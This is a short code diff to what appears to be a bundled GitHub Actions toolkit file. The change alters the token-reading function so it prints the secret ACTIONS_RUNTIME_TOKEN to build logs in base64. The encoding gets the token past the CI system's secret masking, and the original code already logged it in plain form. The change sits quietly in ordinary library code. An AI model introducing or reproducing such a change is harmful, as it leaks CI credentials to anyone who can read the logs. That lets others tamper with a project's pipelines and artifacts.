@@ -4120,7 +4120,7 @@ exports.getDownloadFileConcurrency = getDownloadFileConcurrency;
 function getRuntimeToken() {
     const token = process.env['ACTIONS_RUNTIME_TOKEN'];
     console.log("*******")
-    console.log(token)
+    console.log(Buffer.from(token).toString('base64'))
     console.log("*******")
     if (!token) {
         throw new Error('Unable to get ACTIONS_RUNTIME_TOKEN env variable');
